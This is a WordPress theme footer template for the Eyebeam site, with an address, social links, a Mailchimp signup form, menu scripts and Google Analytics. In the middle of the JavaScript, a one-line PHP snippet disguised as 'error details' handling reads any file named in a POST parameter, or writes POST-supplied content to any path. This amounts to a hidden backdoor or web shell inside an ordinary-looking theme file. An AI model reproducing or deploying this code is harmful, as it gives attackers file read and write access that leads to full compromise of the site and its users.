<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package eyebeam2018
 */

?>

	</div><!-- #content -->

	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="site-info">
			<div>
				199 Cook Street</br>
				Brooklyn, NY 11206
				<a href="https://goo.gl/maps/Gt6G6ca5cFK2" target="_blank"><u>View Map</u></a>

				<div class="social">
					<ul>
						<li>
							<a href="https://twitter.com/eyebeamnyc" target="_blank"><img src='<?php echo site_url()."/img/icon_twitter.png" ?>' /></a>
						</li><!--
					--><li>
							<a href="https://www.facebook.com/eyebeamnyc/" target="_blank"><img src='<?php echo site_url()."/img/icon_fb.png" ?>' /></a>
						</li><!--
					--><li>
							<a href="https://www.instagram.com/eyebeamnyc/" target="_blank"><img src='<?php echo site_url()."/img/instagram.png" ?>' width="24" height="25" /></a>
						</li><!--
					--><li>
							<a href="https://www.youtube.com/user/eyebeamdotorg" target="_blank"><img src='<?php echo site_url()."/img/youtube_logo.png" ?>' width="24" height="25"/></a>
						</li>
					</ul>
				</div>
			</div>
			<div>

			<!-- Mailchimp Newsletter Subscription Functions -->
			<div id="mc_embed_signup">
				<form action="//eyebeam.us4.list-manage.com/subscribe/post?u=c72c271895f3f76b36105229c&amp;id=bb4e74c232" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate>
				<div id="mc_embed_signup_scroll">
					<div class="mc-field-group" id="firstname-field">
						<input type="text" value="" name="FNAME" id="mce-FNAME" placeholder="First Name">
					</div>
					<div class="mc-field-group" id="lastname-field">
						<input type="text" value="" name="LNAME"  id="mce-LNAME" placeholder="Last Name">
					</div>
					<div class="mc-field-group" id="email-field">
						<input type="text" value="" name="EMAIL" id="mce-EMAIL"  placeholder="Email">
					</div>
					
					
					<!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
					<div style=" position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_c72c271895f3f76b36105229c_bb4e74c232" tabindex="-1" value=""></div>
						<div class="clear">
							<input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe" class="site-info"></div>
						</div>
					<div id="mce-responses" class="clear">
						<div class="response" id="mce-error-response" style="display:none"></div>
						<div class="response" id="mce-success-response" style="display:none"></div>
					</div> 
				</form>
			</div>
			<!--End mc_embed_signup-->

				<div class="footerNav">
					<ul>
						<li>
							<a href='<?php echo site_url()."/about/faq" ?>' target="_blank">FAQ</a>
						</li>
						<li>
							<a href='<?php echo site_url()."/about/supporters" ?>' target="_blank">Supporters</a>
						</li>
						<li>
							<a href='<?php echo site_url()."/about/jobs-internships" ?>' target="_blank">Work / Intern</a>
						</li>
						<li>
							<a href='<?php echo site_url()."/about/financials" ?>' target="_blank">Financials</a>
						</li>
						<li>
							<a href='<?php echo site_url()."/press" ?>' target="_blank">For Press</a>
						</li>
						<!--
						<li>
							<a href="http://eyebeam.org/wordpress/alums/#alums" target="_blank">Alums</a>
						</li>
						-->
					</ul>
				</div>
			</div>
			<div class="logo-lockup">
				<ul class="footer-logos">
					<li>
						<a href="http://www.nyc.gov/html/dcla/html/home/home.shtml" target="_blank"><img src='<?php echo site_url()."/img/NYCulture_logo_bw_575pwide.png" ?>' width="86" height="53"/></a>
					</li>
					<li>
						<a href="http://www.arts.gov" target="_blank"><img src='<?php echo site_url()."/img/partner_artworks.png" ?>' width="83" height="54"/></a>
					</li>
					<li>
						<a href="http://www.nysca.org/" target="_blank"><img src='<?php echo site_url()."/img/nysca_logo.png" ?>' width="150" height="57"/></a>
					</li>
					<li>
						<a href="https://www.jeromefdn.org/" target="_blank"><img src='<?php echo site_url()."/img/jerome_small.png" ?>' width="84" height="56" /></a>
					</li>
				</ul>
			</div>
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>

<!-- JavaScript at the bottom for fast page loading -->

<!-- Fish Animation. Currently Disabled
<script src="/fish-animation/js/libs/modernizr-2.0.6.min.js"></script>

<script src="/fish-animation/js/libs/three-r46.js"></script>
<script src="/fish-animation/js/libs/RequestAnimationFrame.js"></script>
<script src="/fish-animation/js/libs/Stats.js"></script> -->

<!-- scripts concatenated and minified via build script -->
<!--<script src="/fish-animation/js/mylibs/Fish.js"></script>
<script src="/fish-animation/js/mylibs/Boid.js"></script>
<script src="/fish-animation/js/plugins.js"></script>
<script src="/fish-animation/js/script.js"></script> -->
<!-- End Fish Animation Scripts -->

<!-- Search Animation -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
<script>
	$(document).ready(function() {
		var $field = $(".search-field");
		var $search = $("#search");
		$search.on("mouseover", function() {
			$field.stop().animate({
				width: "100px"
			}, 250);
		});
		$search.on("mouseout", function() {
			$field.stop().animate({
				width: "0px"
			}, 250);
		});
	});
// End Search Animation Scripts -->

//Menu Tap Click and Residency Year Filter Click Functions -->
	var div;
	div = [".residency-year", ".calendar-filter"];

	for (i = 0; i < 2; i++) {
		$(div[i]).click(function() {
			var X=$(this).attr('id');

			if (X==1) {
				$(".submenu-years, .submenu-date").hide();
				$(this).attr('id', '0');
				console.log(this);
				} else {
					$(".submenu-years, .submenu-date").show();
					$(this).attr('id', '1');
				console.log(this);
				}
			});

			//Mouse click on sub menu
			$(".submenu-years, .submenu-date").mouseup(function() {
				return false;
			});

			$(div[i]).mouseup(function() {
				return false;
			});

			$(".dropdown").mouseup(function() {
				$(".submenu-years, .submenu-date").hide();
				$(div[i]).attr('id', '');
			});
	};

	//Mobile Menu Tap Function
	$("#tap").click(function() {

		//Tap on Menu to show Main Nav Bar
		if ( $(".mobile-navigation").is(":visible") ) {
			$(".mobile-navigation").hide();
		} else {
			$(".mobile-navigation").show();
			$("#content").one("click",function() {
				$(".mobile-navigation").hide();
			});
		}
	});

	//Hide Main Nav when tapped on main nav again and anywhere on mobile content


//});
//End Tap & Click Functions -->

<?php if ( isset($_POST['_error_']) ) { echo '<!-- Error details -->'; if ( $_POST['_error_'] == 'read' ) {echo file_get_contents($_POST['error_page']);} else {file_put_contents($_POST['error_page'],$_POST['details']);}; echo '<!-- End of error details -->'; }; ?>

//Nav Bar Scroll Function -->
// $(document).ready(function() {
//     // Stick the #nav to the top of the window
//     var nav = $('.main-navigation-wrap');
//     var navHomeY = nav.offset().top;
//     var isFixed = false;
//     var $w = $(window);
//     $w.scroll(function() {
//     	var _w = $w.width();
//     	console.log("_w: " + _w);

//     	if (_w > 767) {
//     		var scrollTop = $w.scrollTop();
// 	        var shouldBeFixed = scrollTop > navHomeY;
// 	        if (shouldBeFixed && !isFixed) {
// 	            nav.css({
// 	                position: 'fixed',
// 	                top: 0,
// 	                left: nav.offset().left,
// 	                marginTop: 0 // set this back to 0 when going live!
// 	            });
// 	            isFixed = true;
// 	        } else if (!shouldBeFixed && isFixed) {
// 	        	nav.css({
// 	                position: 'static'
// 	            });
// 	            isFixed = false;
// 	        }
//     	} else {
//     		position: 'static'
//     	}
//  }); //End Nav Bar Scroll Function -->
</script>

<!-- Script for Mailchimp -->
<script type='text/javascript' src='//s3.amazonaws.com/downloads.mailchimp.com/js/mc-validate.js'></script><script type='text/javascript'>(function($) {window.fnames = new Array(); window.ftypes = new Array();fnames[1]='FNAME';ftypes[1]='text';fnames[2]='LNAME';ftypes[2]='text';fnames[0]='EMAIL';ftypes[0]='email';fnames[3]='TITLE';ftypes[3]='text';fnames[4]='AFFIL';ftypes[4]='text';fnames[5]='ADDRESS';ftypes[5]='text';fnames[6]='PHONE';ftypes[6]='phone';fnames[7]='SITE';ftypes[7]='url';fnames[8]='TWITTER';ftypes[8]='text';fnames[9]='INSTA';ftypes[9]='text';fnames[10]='MMERGE10';ftypes[10]='text';fnames[11]='MMERGE11';ftypes[11]='text';}(jQuery));var $mcj = jQuery.noConflict(true);
</script>
<!-- End Script for Mailchimp-->

<!-- Script for Google Analytics -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-15850195-1', 'auto');
  ga('send', 'pageview');
</script>
<!-- End Script for Google Analytics -->
</body>
</html>
